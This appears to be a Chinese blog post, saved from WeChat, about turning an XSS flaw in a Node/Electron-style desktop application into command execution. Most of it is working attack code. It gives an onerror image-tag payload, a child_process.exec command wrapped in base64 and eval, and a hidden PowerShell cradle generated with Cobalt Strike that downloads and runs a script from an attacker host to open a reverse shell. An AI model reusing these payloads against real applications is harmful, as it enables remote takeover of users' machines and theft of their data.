> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZX05EPTYPPGru64DnCOG5g)

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2rfwicICleuUVO2Av0aqK8R6MskAyG13HLziaFU1jj4ibEpvXicwWT2ibF0SXdjqEhicEIVvrfm3anV36w/640?wx_fmt=png)

漏洞利用方式：

选择事件型 XSS 需要附带 onerror 事件，比如 img、audio 等。

弹窗代码：

<img src=x oneror=alert(1)>

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2rfwicICleuUVO2Av0aqK8RCBykwMJzZNiaexn8ekueZxB5e7jf5ic8jRZOW9XXjrz60bAKX3JjYfKw/640?wx_fmt=png)

构造命令执行 payload

require('child_process').exec('ipconfig/all',(error, stdout, stderr)=>{

   alert(`stdout: ${stdout}`);

  });

最终利用代码：

<img src=# onerror='eval(newBuffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=`,`base64`).toString())'>

反弹 shell 命令

CS 生成 powershell 脚本

```
powershell.exe -nop -w hidden -c "IEX((new-objectnet.webclient).downloadstring('http://127.0.0.1/test/'))"
 
require('child_process').exec('powershell.exe-nop -w hidden -c "IEX ((new-objectnet.webclient).downloadstring(\'http://127.0.0.1/test\'))"',(error,stdout, stderr)=>{
   alert(`stdout: ${stdout}`);
  });
 
cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3Bvd2Vyc2hlbGwuZXhlIC1ub3AgLXcgaGlkZGVuIC1jICJJRVggKChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKFwnaHR0cDovLzE5Mi4xNjguNzIuMTI5OjgwODEvYWJjZGVcJykpIicsKGVycm9yLCBzdGRvdXQsIHN0ZGVycik9PnsKICAgIGFsZXJ0KGBzdGRvdXQ6ICR7c3Rkb3V0fWApOwogIH0pOw==
 
<img src=# onerror='eval(newBuffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3Bvd2Vyc2hlbGwuZXhlIC1ub3AgLXcgaGlkZGVuIC1jICJJRVggKChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKFwnaHR0cDovLzE5Mi4xNjguNzIuMTI5OjgwODEvYWJjZGVcJykpIicsKGVycm9yLCBzdGRvdXQsIHN0ZGVycik9PnsKICAgIGFsZXJ0KGBzdGRvdXQ6ICR7c3Rkb3V0fWApOwogIH0pOw==`,`base64`).toString())'>
```

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2rfwicICleuUVO2Av0aqK8REzHKuk27Bz7hdgn2XlDbe4wFqTXOOHYanZox9iaYSYmyibIE3vSrACgw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2rfwicICleuUVO2Av0aqK8Rf2XgibYNUuZe7KoAiahtxYk5GU8pvUicFYdscGKHBP2MkqN3rKFia8yTAA/640?wx_fmt=png)